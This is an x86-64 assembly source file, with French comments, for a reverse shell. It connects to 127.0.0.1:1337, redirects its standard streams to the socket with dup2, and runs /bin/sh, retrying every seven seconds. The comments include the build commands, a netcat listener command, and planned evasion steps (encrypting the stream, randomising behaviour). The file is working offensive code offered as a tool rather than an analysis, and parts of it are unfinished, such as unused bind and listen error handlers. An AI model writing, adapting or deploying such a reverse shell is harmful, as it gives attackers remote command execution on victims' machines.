global _start
extern write
extern read
extern exit
extern nano_sleep
extern execve
extern dup2
;essayer de chiffrer le flux 
;essayer de mettre de fonctionnement au hasard 

;nasm -f elf64 main.s -o main.o
;nasm -f elf64 fun.s -o fun.o
;ld -o progAssembly main.o fun.o


;nc -lvp 1337 = ecoute sur le port 1337


section .data
    sockaddr:
        dw 2    
        dw 0x3905 ; 0x3905 = 0x05 0x39 = 1337p
        dd 0x0100007F
        dq 0

    msg:
        conn_test_msg db ">> Connect to machine....", 0x0A
        conn_test_msg_len equ $ - conn_test_msg

        conn_success_msg db ">> Connected!", 0x0A
        conn_success_msg_len equ $ - conn_success_msg

        sock_init_msg db ">> Socket initialisation....", 0x0A
        sock_init_msg_len equ $ - sock_init_msg

        socket_err_msg db ">> /!\Socket initialisation error/!\", 0x0A
        socket_err_msg_len equ $ - socket_err_msg

        bind_err_msg db ">> /!\failed bind socket/!\", 0x0A
        bind_err_msg_len equ $ - bind_err_msg

        lstn_err_msg db "failed listen socket", 0x0A
        lstn_err_msg_len equ $ - lstn_err_msg

        accept_msg db"attack connected", 0x0A
        accept_msg_len equ $ - accept_msg

        create_shll_err_msg db "failed to create shell", 0x0A
        create_shll_msg_err_len equ $ - create_shll_err_msg

        create_shll_msg db ">> Waiting shell to create....", 0x0A
        create_shll_msg_len equ $ - create_shll_msg  

        shll_success_msg db ">> Shell created ! ", 0x0A
        shll_success_msg_len equ $ - shll_success_msg

    timespec:
        dq 7 ;rewind toute les 7 sec
        dq 0         
    
    shell:
        db "/bin/sh", 0
        argv dq shell, 0
        env dq 0

section .bss
    sockfd resq 1

section .text

_start:
.connection:  


    mov rdi, 2
    mov rsi, sock_init_msg
    mov rdx, sock_init_msg_len
    call write 

    ;socket creation
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov [sockfd], rax ;stock socket fd


    ;tentative de connection
    mov rdi, rax
    lea rsi, [rel sockaddr]
    mov rdx, 16
    mov rax, 42
    syscall
    test rax, rax
    js .connect_err ;si erreur alors sleep

    mov rdi, 2
    mov rsi, conn_test_msg
    mov rdx, conn_test_msg_len
    call write

    mov rdi, 2
    mov rsi, conn_success_msg
    mov rdx, conn_success_msg_len
    call write


    mov rdi, 2
    mov rsi, create_shll_msg
    mov rdx, create_shll_msg_len
    call write

    mov rsi, 0
.redirection:
    mov rdi, [sockfd]
    call dup2 ; duplication du fd
    inc rsi
    cmp rsi, 3
    jne .redirection ;si erreur redirection
 

    ;creation reverse shell
    lea rdi, [rel shell]
    lea rsi, [rel argv]
    lea rdx, [rel env]
    call execve
    jmp .error_shell_err
    ;si erreur alors sleep


.error_shell_err: ;gestion erreur 
    mov rdi, 2
    mov rsi, create_shll_err_msg
    mov rdx, create_shll_msg_err_len
    call write
    jmp .sleep

.connect_err:
    mov rdi, 2
    mov rsi, socket_err_msg
    mov rdx, socket_err_msg_len
    call write  
    jmp .sleep

.bind_err:
    mov rdi, 2
    mov rsi, bind_err_msg
    mov rdx, bind_err_msg_len
    call write  
    jmp .sleep

    
.sleep:
    lea rdi, [rel timespec]
    mov rsi, 0
    mov rax, 35
    syscall
    jmp _start ;si erreur alors recommence


.exit: 
    mov rdi, 0
    call exit
    